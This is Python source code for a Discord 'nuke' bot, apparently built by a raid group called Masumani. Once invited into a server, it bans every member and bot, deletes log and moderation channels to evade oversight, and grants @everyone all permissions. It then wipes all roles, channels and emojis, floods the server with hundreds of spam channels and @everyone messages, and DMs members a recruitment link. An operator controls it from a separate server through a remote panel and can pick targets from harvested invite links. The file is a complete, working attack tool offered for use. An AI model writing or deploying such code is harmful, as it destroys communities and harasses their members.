import discord
from discord.ext import commands
import asyncio
import random
import os
import json
import signal
import sys
from dotenv import load_dotenv
from typing import Optional, List, Set, Dict, Any, Coroutine
from dataclasses import dataclass
import logging
from logging.handlers import RotatingFileHandler

@dataclass(frozen=True)
class BotConfig:
    token: str
    prefix: str
    default_new_name: str
    invite_link: str
    manage_guild_id: int
    manage_channel_id: int
    panel_state_file: str = "panel_state.json"

    @classmethod
    def from_env(cls) -> "BotConfig":
        load_dotenv()
        token = os.getenv("TOKEN")
        if not token:
            raise ValueError("環境変数 TOKEN が設定されていません")
        return cls(
            token=token,
            prefix=os.getenv("PREFIX", "!"),
            default_new_name=os.getenv("DEFAULT_NEW_NAME", "ますまに共栄圏植民地"),
            invite_link=os.getenv("INVITE_LINK", "https://discord.gg/masu"),
            manage_guild_id=int(os.getenv("MANAGE_GUILD_ID", "0")),
            manage_channel_id=int(os.getenv("MANAGE_CHANNEL_ID", "0")),
        )

CONFIG = BotConfig.from_env()

def setup_logging() -> logging.Logger:
    logger = logging.getLogger("nuke_bot")
    logger.setLevel(logging.INFO)
    formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(name)s: %(message)s')
    sh = logging.StreamHandler(sys.stdout)
    sh.setFormatter(formatter)
    logger.addHandler(sh)
    fh = RotatingFileHandler(
        "bot.log", maxBytes=5*1024*1024, backupCount=5,
        encoding='utf-8'
    )
    fh.setFormatter(formatter)
    logger.addHandler(fh)
    return logger

logger = setup_logging()

class PanelState:
    def __init__(self, filepath: str) -> None:
        self.filepath = filepath
        self.data: Dict[str, Any] = {}
        self.load()

    def load(self) -> None:
        if os.path.exists(self.filepath):
            try:
                with open(self.filepath, 'r', encoding='utf-8') as f:
                    self.data = json.load(f)
            except Exception as e:
                logger.error(f"パネル状態読み込み失敗: {e}")

    def save(self) -> None:
        try:
            with open(self.filepath, 'w', encoding='utf-8') as f:
                json.dump(self.data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"パネル状態保存失敗: {e}")

    def get_panel_message_id(self) -> Optional[int]:
        return self.data.get("manage_panel_message_id")

    def set_panel_message_id(self, message_id: int) -> None:
        self.data["manage_panel_message_id"] = message_id
        self.save()

panel_state = PanelState(CONFIG.panel_state_file)

class RateLimitManager:
    def __init__(self, max_concurrent: int = 48):
        self.global_sem = asyncio.Semaphore(max_concurrent)
        self._active_tasks: Set[asyncio.Task] = set()

    async def execute(self, coro: Coroutine, *, retry_on_429: bool = True) -> Any:
        async with self.global_sem:
            try:
                return await coro
            except discord.HTTPException as e:
                if e.status == 429 and retry_on_429:
                    retry_after = getattr(e, 'retry_after', 1.0) + random.uniform(0.1, 0.5)
                    logger.warning(f"429 rate limited. Retry after {retry_after:.2f}s")
                    await asyncio.sleep(retry_after)
                    async with self.global_sem:
                        try:
                            return await coro
                        except Exception as e2:
                            logger.error(f"Retry failed: {e2}")
                            return None
                else:
                    logger.error(f"HTTP Exception [{e.status}]: {e.text}")
                    return None
            except Exception as e:
                logger.error(f"Unexpected error: {e}")
                return None

    def create_task(self, coro: Coroutine, *, name: Optional[str] = None) -> asyncio.Task:
        async def wrapper():
            return await self.execute(coro)
        task = asyncio.create_task(wrapper(), name=name)
        self._active_tasks.add(task)
        task.add_done_callback(self._active_tasks.discard)
        task.add_done_callback(self._on_task_done)
        return task

    def _on_task_done(self, task: asyncio.Task) -> None:
        exc = task.exception()
        if exc:
            logger.error(f"Task {task.get_name()} raised: {exc}", exc_info=exc)

    async def cancel_all(self) -> None:
        for task in list(self._active_tasks):
            if not task.done():
                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass
        logger.info(f"全タスクキャンセル完了（残り{len(self._active_tasks)}件）")

rate_mgr = RateLimitManager(max_concurrent=48)
task_mgr = rate_mgr

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.bans = True
intents.guilds = True

bot = commands.Bot(
    command_prefix=CONFIG.prefix,
    intents=intents,
    help_command=None,
    case_insensitive=True
)

async def notify_manage_channel(content: str, embed: Optional[discord.Embed] = None) -> None:
    try:
        guild = bot.get_guild(CONFIG.manage_guild_id)
        if not guild:
            return
        channel = guild.get_channel(CONFIG.manage_channel_id)
        if not channel or not isinstance(channel, discord.TextChannel):
            return
        await rate_mgr.execute(channel.send(content=content, embed=embed))
    except Exception as e:
        logger.error(f"管理チャンネル通知失敗: {e}")

async def create_channel_safely(guild: discord.Guild, name: str) -> Optional[discord.TextChannel]:
    return await rate_mgr.execute(guild.create_text_channel(name))

async def create_colored_roles_batch(guild: discord.Guild, count: int, batch_size: int = 30) -> int:
    created = 0
    for i in range(0, count, batch_size):
        batch_count = min(batch_size, count - i)
        coros = [
            rate_mgr.execute(
                guild.create_role(
                    name="ますまに共栄圏に荒らされましたｗｗｗ",
                    color=discord.Color.random(),
                    hoist=True,
                    mentionable=True
                )
            )
            for _ in range(batch_count)
        ]
        results = await asyncio.gather(*coros, return_exceptions=True)
        created += sum(1 for r in results if isinstance(r, discord.Role))
        logger.info(f"Role creation progress: {created}/{count}")
        await asyncio.sleep(random.uniform(0.1, 0.2))
    return created

async def ban_all_members(guild: discord.Guild, members: List[discord.Member], reason: str) -> int:
    banned = 0
    batch_size = 50
    for i in range(0, len(members), batch_size):
        batch = members[i:i+batch_size]
        coros = []
        for m in batch:
            if m == guild.me:
                continue
            coros.append(
                rate_mgr.execute(
                    guild.ban(m, reason=reason, delete_message_seconds=0)
                )
            )
        if coros:
            results = await asyncio.gather(*coros, return_exceptions=True)
            banned += sum(1 for r in results if r is True or isinstance(r, discord.User))
            logger.info(f"Ban progress: {banned}/{len(members)}")
        await asyncio.sleep(random.uniform(0.05, 0.1))
    return banned

async def delete_emojis_and_stickers(guild: discord.Guild) -> None:
    try:
        emojis, stickers = await asyncio.gather(
            guild.fetch_emojis(), guild.fetch_stickers(),
            return_exceptions=True
        )
        delete_coros = []
        if isinstance(emojis, list):
            delete_coros.extend(rate_mgr.execute(e.delete()) for e in emojis)
        if isinstance(stickers, list):
            delete_coros.extend(rate_mgr.execute(s.delete()) for s in stickers)
        if delete_coros:
            await asyncio.gather(*delete_coros, return_exceptions=True)
        logger.info(f"Deleted {len(emojis) if isinstance(emojis, list) else 0} emojis, {len(stickers) if isinstance(stickers, list) else 0} stickers")
    except Exception as e:
        logger.error(f"Emoji/sticker deletion error: {e}")

async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None) -> None:
    if guild.id == CONFIG.manage_guild_id:
        logger.info(f"管理サーバー({guild.name})のためヌークをスキップ")
        return

    new_name = new_server_name or CONFIG.default_new_name

    if guild.member_count > 1000 and not guild.chunked:
        logger.info(f"大規模サーバー検出: {guild.name} ({guild.member_count}人) → メンバーチャンク取得中...")
        try:
            await guild.chunk()
        except Exception as e:
            logger.error(f"チャンク取得失敗: {e}")

    members = [m for m in guild.members if m != bot.user]
    non_bot_members = [m for m in members if not m.bot]

    logger.info(f"破壊開始: {guild.name} 非BOT={len(non_bot_members)}")
    await notify_manage_channel(f"🚀 **{guild.name}** でヌークを開始します（非BOT: {len(non_bot_members)}人）")

    bot_ban_coros = [
        rate_mgr.execute(guild.ban(m, reason="", delete_message_seconds=0))
        for m in members if m.bot
    ]
    if bot_ban_coros:
        results = await asyncio.gather(*bot_ban_coros, return_exceptions=True)
        success = sum(1 for r in results if not isinstance(r, Exception))
        logger.info(f"Bot BAN完了: {success}/{len(bot_ban_coros)} 成功")

    log_keywords = [
        "log", "ログ", "audit", "監視", "mod", "moderation",
        "admin", "管理", "report", "報告", "ticket", "チケット"
    ]
    channels = list(guild.channels)
    log_channels = [
        ch for ch in channels
        if any(kw.lower() in ch.name.lower() for kw in log_keywords)
    ]
    if log_channels:
        delete_coros = [rate_mgr.execute(ch.delete()) for ch in log_channels]
        await asyncio.gather(*delete_coros, return_exceptions=True)
        logger.info(f"ログチャンネル削除完了: {len(log_channels)}個")
        await asyncio.sleep(1)

    everyone_role = guild.default_role
    permissions = discord.Permissions.all()
    await rate_mgr.execute(everyone_role.edit(permissions=permissions))
    logger.warning(f"@everyone権限を最大化しました: {guild.name}")

    await rate_mgr.execute(guild.edit(icon=None, banner=None, splash=None))
    logger.info(f"サーバーアセットを削除しました: {guild.name}")

    await delete_emojis_and_stickers(guild)

    await rate_mgr.execute(guild.edit(
        verification_level=discord.VerificationLevel.none,
        explicit_content_filter=discord.ContentFilter.disabled,
        default_notifications=discord.NotificationLevel.all_messages,
        community=False
    ))
    logger.info(f"コミュニティ設定を無効化しました: {guild.name}")

    await rate_mgr.execute(guild.edit(system_channel=None, rules_channel=None))
    logger.info(f"システムチャンネルを無効化しました: {guild.name}")

    dm_members = [m for m in non_bot_members if not m.guild_permissions.administrator]
    dm_coros = [
        rate_mgr.execute(m.send(CONFIG.invite_link))
        for m in dm_members
    ]
    dm_task = asyncio.gather(*dm_coros, return_exceptions=True) if dm_coros else None

    # ロール完全削除ループ（残り0になるまで最大5回）
    async def delete_roles_fully(guild: discord.Guild) -> None:
        max_attempts = 5
        for attempt in range(1, max_attempts + 1):
            roles = [r for r in guild.roles if not r.is_default() and not r.managed]
            if not roles:
                logger.info("全ロール削除完了")
                return
            logger.info(f"ロール削除試行 {attempt}: 残り {len(roles)}個")
            batch_size = 30
            for i in range(0, len(roles), batch_size):
                batch = roles[i:i+batch_size]
                coros = [rate_mgr.execute(r.delete()) for r in batch]
                await asyncio.gather(*coros, return_exceptions=True)
                await asyncio.sleep(0.1)
            await asyncio.sleep(1)
        remaining = [r for r in guild.roles if not r.is_default() and not r.managed]
        logger.warning(f"ロール削除完了（残り {len(remaining)}個）")

    role_delete_task = asyncio.create_task(delete_roles_fully(guild))

    # チャンネル完全削除ループ（残り0になるまで最大5回）
    async def delete_channels_fully(guild: discord.Guild) -> None:
        max_attempts = 5
        for attempt in range(1, max_attempts + 1):
            channels = list(guild.channels)
            if not channels:
                logger.info("全チャンネル削除完了")
                return
            logger.info(f"チャンネル削除試行 {attempt}: 残り {len(channels)}個")
            # カテゴリを先に削除（子チャンネルも消える）
            categories = [ch for ch in channels if isinstance(ch, discord.CategoryChannel)]
            text_voice = [ch for ch in channels if not isinstance(ch, discord.CategoryChannel)]
            delete_coros = [rate_mgr.execute(ch.delete()) for ch in categories + text_voice]
            # バッチ処理
            batch_size = 40
            for i in range(0, len(delete_coros), batch_size):
                batch = delete_coros[i:i+batch_size]
                await asyncio.gather(*batch, return_exceptions=True)
                await asyncio.sleep(0.05)
            await asyncio.sleep(1)
        remaining = list(guild.channels)
        logger.warning(f"チャンネル削除完了（残り {len(remaining)}個）")

    channel_delete_task = asyncio.create_task(delete_channels_fully(guild))

    ban_task = asyncio.create_task(ban_all_members(guild, non_bot_members, new_name))

    await rate_mgr.execute(guild.edit(name=new_name))

    member_count = len(non_bot_members)
    if member_count < 100:
        target_channels = 250
    elif member_count < 500:
        target_channels = 200
    else:
        target_channels = 150
    target_roles = 250

    async def create_channels(guild: discord.Guild, count: int) -> List[discord.TextChannel]:
        created = []
        channel_names = ["ますまに共栄圏万歳", "Raid by Masumani", "Masumani ON TOP"]
        batch_size = 40
        idx = 0
        while len(created) < count:
            current_batch = min(batch_size, count - len(created))
            coros = [
                create_channel_safely(guild, channel_names[idx % len(channel_names)])
                for _ in range(current_batch)
            ]
            results = await asyncio.gather(*coros, return_exceptions=True)
            for r in results:
                if isinstance(r, discord.TextChannel):
                    created.append(r)
                    idx += 1
            logger.info(f"チャンネル作成進捗: {len(created)}/{count}")
            await asyncio.sleep(0.1)
        return created

    channel_create_task = asyncio.create_task(create_channels(guild, target_channels))
    role_create_task = asyncio.create_task(create_colored_roles_batch(guild, target_roles))

    await channel_delete_task
    await role_delete_task
    await ban_task
    if dm_task:
        dm_results = await dm_task
        logger.info(f"DM送信完了: {sum(1 for r in dm_results if not isinstance(r, Exception))}/{len(dm_coros)} 成功")
    channels_created = await channel_create_task
    roles_created = await role_create_task
    logger.info(f"チャンネル作成完了: {len(channels_created)}個, ロール作成完了: {roles_created}個")

    spam_messages = [
        f"@everyone Raid by Masumani Masumani ON TOP {CONFIG.invite_link}",
        f"@everyone Masumani ON TOP 来い {CONFIG.invite_link}",
        f"@everyone Raid by Masumani ますまに共栄圏 {CONFIG.invite_link}"
    ]
    active_channels = channels_created.copy()
    message_counters = {ch.id: 0 for ch in active_channels}
    spam_round = 0

    while active_channels:
        spam_round += 1
        spam_coros = []
        for ch in active_channels[:]:
            if message_counters[ch.id] >= 300:
                active_channels.remove(ch)
                continue
            spam_coros.append(rate_mgr.execute(ch.send(random.choice(spam_messages))))
            message_counters[ch.id] += 1

        if spam_coros:
            await asyncio.gather(*spam_coros, return_exceptions=True)

        if spam_round % 50 == 0:
            logger.info(f"Spam progress: round {spam_round}, active channels: {len(active_channels)}")

        await asyncio.sleep(1.0)

    logger.info("ヌーク完了 → bot退出")
    await notify_manage_channel(f"✅ **{guild.name}** のヌークが完了しました。Botが退出します。")

    try:
        await rate_mgr.execute(guild.leave())
        logger.info(f"サーバーから退出しました: {guild.name}")
    except Exception as e:
        logger.error(f"退出失敗: {e}")

    logger.info("完了")

class NukeButtonView(discord.ui.View):
    def __init__(self, guild_id: int, bot: commands.Bot):
        super().__init__(timeout=None)
        self.guild_id = guild_id
        self.bot = bot

    @discord.ui.button(label="!Masumani 実行", style=discord.ButtonStyle.danger, custom_id="nuke_button")
    async def nuke_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = self.bot.get_guild(self.guild_id)
        if guild and guild.id != CONFIG.manage_guild_id:
            await interaction.response.send_message(
                f"{guild.name} でヌークを開始します。", 
                ephemeral=True
            )
            rate_mgr.create_task(core_nuke(guild), name=f"nuke_btn_{guild.id}")
        else:
            await interaction.response.send_message(
                "サーバーが見つからないか、保護されています。", 
                ephemeral=True
            )

class ManageView(discord.ui.View):
    def __init__(self, bot: commands.Bot):
        super().__init__(timeout=None)
        self.bot = bot

    @discord.ui.button(label="サーバー一覧", style=discord.ButtonStyle.primary, custom_id="list_servers")
    async def list_servers(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="ボットが入ってるサーバー一覧", color=discord.Color.blue())
        for g in self.bot.guilds:
            if g.id != CONFIG.manage_guild_id:
                embed.add_field(
                    name=g.name, 
                    value=f"ID: {g.id}\nメンバー: {g.member_count}", 
                    inline=False
                )
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.select(placeholder="ヌーク対象サーバー選択", options=[], custom_id="select_guild")
    async def select_guild(self, interaction: discord.Interaction, select: discord.ui.Select):
        guild_id = int(select.values[0])
        guild = self.bot.get_guild(guild_id)
        if guild and guild.id != CONFIG.manage_guild_id:
            rate_mgr.create_task(core_nuke(guild), name=f"nuke_sel_{guild.id}")
            await interaction.response.send_message(
                f"{guild.name} でヌーク起動しました。", 
                ephemeral=True
            )
        else:
            await interaction.response.send_message(
                "無効なサーバーまたは保護されています。", 
                ephemeral=True
            )

async def send_or_update_panel(channel: discord.TextChannel, view: discord.ui.View) -> Optional[discord.Message]:
    existing_id = panel_state.get_panel_message_id()
    if existing_id:
        try:
            msg = await channel.fetch_message(existing_id)
            await msg.edit(content="サーバー管理パネル", view=view)
            logger.info(f"既存パネルを更新しました (ID: {existing_id})")
            return msg
        except discord.NotFound:
            logger.info("保存されたパネルが見つかりません。新規作成します。")
        except Exception as e:
            logger.error(f"パネル取得失敗: {e}")
    try:
        msg = await channel.send("サーバー管理パネル", view=view)
        panel_state.set_panel_message_id(msg.id)
        logger.info(f"新規パネルを送信しました (ID: {msg.id})")
        return msg
    except Exception as e:
        logger.error(f"パネル送信失敗: {e}")
        return None

@bot.event
async def setup_hook() -> None:
    bot.add_view(ManageView(bot))
    logger.info("Persistent Views を登録しました")

@bot.event
async def on_ready():
    if getattr(bot, '_ready_once', False):
        return
    bot._ready_once = True

    logger.info(f"起動: {bot.user}")
    logger.info("=== ボット起動時の全サーバー情報 ===")

    for guild in bot.guilds:
        if guild.id == CONFIG.manage_guild_id:
            logger.info(f"管理サーバー: {guild.name} → 残留（保護）")
            await log_server_info(guild)
            continue

        non_bot_members = [m for m in guild.members if not m.bot and m != guild.me]
        member_count = len(non_bot_members)

        if member_count <= 5 and not guild.name.startswith("ま") or guild.name == "郁郁地区美通話":
            logger.info(f"起動時自動退出: {guild.name} (メンバー含まず {member_count}人)")
            try:
                await rate_mgr.execute(guild.leave())
            except Exception as e:
                logger.error(f"退出失敗: {e}")
        else:
            await log_server_info(guild)

    logger.info("=====================================")

    manage_guild = bot.get_guild(CONFIG.manage_guild_id)
    if manage_guild:
        manage_channel = manage_guild.get_channel(CONFIG.manage_channel_id)
        if manage_channel and isinstance(manage_channel, discord.TextChannel):
            view = ManageView(bot)
            options = [
                discord.SelectOption(label=g.name, value=str(g.id)) 
                for g in bot.guilds if g.id != CONFIG.manage_guild_id
            ]
            if options:
                view.select_guild.options = options
                await send_or_update_panel(manage_channel, view)
            else:
                if not panel_state.get_panel_message_id():
                    await manage_channel.send("現在、操作可能な対象サーバーはありません。")
        else:
            logger.warning("管理チャンネルが見つからないか、テキストチャンネルではありません")
    else:
        logger.warning("管理サーバーが見つかりません")

@bot.event
async def on_guild_join(guild: discord.Guild):
    if guild.id == CONFIG.manage_guild_id:
        logger.info(f"管理サーバー参加: {guild.name} → 残留（保護）")
        return

    if guild.member_count > 1000 and not guild.chunked:
        try:
            await guild.chunk()
        except Exception as e:
            logger.error(f"チャンク取得失敗: {e}")

    non_bot_members = [m for m in guild.members if not m.bot and m != guild.me]
    member_count = len(non_bot_members)

    if member_count <= 5 and not guild.name.startswith("ま") or guild.name == "郁郁地区美通話":
        logger.info(f"自動退出: {guild.name} (メンバー含まず {member_count}人)")
        try:
            await rate_mgr.execute(guild.leave())
        except Exception as e:
            logger.error(f"退出失敗: {e}")
        return

    logger.info(f"新規参加: {guild.name} (メンバー含まず {member_count}人) → 残留")
    manage_guild = bot.get_guild(CONFIG.manage_guild_id)
    if manage_guild:
        manage_channel = manage_guild.get_channel(CONFIG.manage_channel_id)
        if manage_channel and isinstance(manage_channel, discord.TextChannel):
            invite_link = "取得失敗"
            try:
                invites = await guild.invites()
                permanent_invite = None
                for inv in invites:
                    if inv.max_age == 0 and inv.max_uses == 0:
                        permanent_invite = inv
                        break
                    if inv.inviter is None or inv.inviter == guild.owner:
                        permanent_invite = inv
                        break
                if permanent_invite:
                    invite_link = permanent_invite.url
                else:
                    if guild.text_channels:
                        channel = guild.text_channels[0]
                        new_invite = await rate_mgr.execute(channel.create_invite(
                            max_age=0, max_uses=0, unique=True, 
                            reason="Bot自動永久招待"
                        ))
                        invite_link = new_invite.url if new_invite else "作成失敗"
                    else:
                        invite_link = "テキストチャンネルなし"
            except Exception as e:
                invite_link = f"エラー: {str(e)}"

            embed = discord.Embed(
                title=f"新サーバー参加: {guild.name}", 
                color=discord.Color.green()
            )
            embed.add_field(name="ID", value=guild.id, inline=False)
            embed.add_field(name="メンバー数", value=guild.member_count, inline=False)
            embed.add_field(name="招待リンク", value=invite_link, inline=False)
            view = NukeButtonView(guild.id, bot)
            await manage_channel.send(embed=embed, view=view)
        else:
            logger.warning("管理チャンネルが見つかりません")

@bot.event
async def on_command_error(ctx: commands.Context, error: commands.CommandError) -> None:
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send("権限が不足しています。", delete_after=10)
    elif isinstance(error, commands.NoPrivateMessage):
        await ctx.send("サーバー内でのみ使用できます。", delete_after=10)
    else:
        logger.error(f"Command error in {ctx.command}: {error}", exc_info=error)
        await ctx.send(f"エラーが発生しました: {error}", delete_after=15)

@bot.command(name="masumani", aliases=["setup"])
async def trigger(ctx: commands.Context, *, new_name: Optional[str] = None) -> None:
    if not ctx.guild or ctx.guild.id == CONFIG.manage_guild_id:
        await ctx.send("このサーバーでは使用できません。", delete_after=10)
        return
    try:
        await ctx.message.delete()
    except Exception as e:
        logger.debug(f"Message delete failed: {e}")
    rate_mgr.create_task(core_nuke(ctx.guild, new_name), name=f"nuke_cmd_{ctx.guild.id}")

async def log_server_info(guild: discord.Guild) -> None:
    member_count = guild.member_count
    server_name = guild.name
    invite_link = "取得失敗（権限不足 or チャンネルなし）"

    try:
        invites = await guild.invites()
        permanent_invite = None
        for inv in invites:
            if inv.max_age == 0 and inv.max_uses == 0:
                permanent_invite = inv
                break
            if inv.inviter is None or inv.inviter == guild.owner:
                permanent_invite = inv
                break

        if permanent_invite:
            invite_link = permanent_invite.url
        else:
            if guild.text_channels:
                channel = guild.text_channels[0]
                new_invite = await rate_mgr.execute(channel.create_invite(
                    max_age=0, max_uses=0, unique=True, 
                    reason="Bot自動永久招待"
                ))
                invite_link = new_invite.url if new_invite else "作成失敗"
            else:
                invite_link = "テキストチャンネルなし"
    except discord.Forbidden:
        invite_link = "権限不足（MANAGE_CHANNELS or CREATE_INSTANT_INVITEが必要）"
    except Exception as e:
        invite_link = f"エラー: {str(e)}"

    logger.info(f"サーバー: {server_name}")
    logger.info(f"メンバー数: {member_count}")
    logger.info(f"永久招待リンク: {invite_link}")
    logger.info("---")

async def shutdown() -> None:
    logger.info("シャットダウンシーケンスを開始します...")
    await rate_mgr.cancel_all()
    await bot.close()
    logger.info("Botを終了しました")

def signal_handler(sig, frame) -> None:
    logger.info(f"シグナル {sig} を受信しました")
    asyncio.create_task(shutdown())

from fastapi import FastAPI
import threading
import uvicorn

app = FastAPI()

@app.get("/")
async def health_check():
    return {
        "status": "alive",
        "bot": str(bot.user) if bot.user else "starting",
        "guilds": len(bot.guilds) if bot.user else 0
    }

@app.get("/ping")
async def ping():
    return {"status": "ok"}

def run_web_server():
    uvicorn.run(app, host="0.0.0.0", port=10000, log_level="warning")

if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda s, f: asyncio.create_task(shutdown()))
    signal.signal(signal.SIGTERM, lambda s, f: asyncio.create_task(shutdown()))

    web_thread = threading.Thread(target=run_web_server, daemon=True)
    web_thread.start()
    logger.info("Health check server started on port 10000")

    try:
        bot.run(CONFIG.token)
    except Exception as e:
        logger.critical(f"Bot起動失敗: {e}", exc_info=True)
        sys.exit(1)
